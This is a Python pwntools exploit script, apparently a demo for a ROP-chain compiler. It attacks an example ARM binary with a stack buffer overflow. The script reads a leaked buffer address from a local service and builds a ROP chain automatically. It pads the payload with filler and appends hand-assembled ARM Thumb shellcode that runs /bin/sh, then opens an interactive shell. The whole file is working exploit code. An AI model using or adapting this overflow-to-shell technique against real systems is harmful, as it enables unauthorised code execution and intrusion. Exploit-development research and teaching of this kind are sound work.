import sys, logging
import archinfo
from pwn import *
from rop_compiler import ropme

filename = './example/arm_bof'
p = remote('localhost', 2222)

buffer_address = struct.unpack("<I", p.read(4))[0]

shellcode = (
    "\x01\x30\x8f\xe2" # add r3, pc, #1  ; 0x1
  + "\x13\xff\x2f\xe1" # bx r3 (to the next instruction)
  + "\x78\x46" # mov r0, pc
  + "\x0c\x30" # adds r0, #12
  + "\x01\x90" # str r0, [sp, #4]
  + "\x01\xa9" # add r1, sp, #4
  + "\x92\x1a" # subs  r2, r2, r2
  + "\x02\x92" # str r2, [sp, #8]
  + "\x0b\x27" # movs  r7, #11
  + "\x01\xdf" # svc 1
  + "//bin/sh" # program to execute
  + "\x00"     # NULL to end the string
)
target_address = buffer_address + 700
print "shellcode ({} bytes) address: 0x{:x}".format(len(shellcode), target_address)

print "Using automatically built ROP chain"
rop = ropme.rop_to_shellcode([(filename, None, 0)], target_address, archinfo.ArchARM(), logging.DEBUG)

payload = 'A'*512 + 'B'*4 + rop
payload += ((700 - len(payload)) * 'B') + shellcode
payload += "JEFF" # To end our input

with open("/tmp/rop", "w") as f: f.write(rop)
with open("/tmp/payload", "w") as f: f.write(payload)

p.writeline(payload)
p.interactive()
